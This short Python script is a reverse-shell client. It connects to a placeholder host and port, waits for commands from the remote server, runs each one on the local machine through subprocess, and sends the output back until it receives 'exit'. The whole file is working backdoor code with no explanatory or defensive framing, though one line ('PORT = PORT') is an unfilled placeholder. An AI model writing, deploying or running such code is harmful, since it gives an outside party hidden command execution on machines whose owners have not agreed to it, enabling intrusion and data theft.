import socket
import subprocess
import sys
import os
import class1

HOST = "ADDRESS"
PORT = PORT
BUFFER_SIZE = 1024

# create the socket object
s = socket.socket()
try:
    # connect to the server
    s.connect((HOST, PORT))
    print("connecting...")
except:
    print("Failed to connect to proxy")
    sys.exit()
# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        print("Lost Connection to Server: Disconnected by User")
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()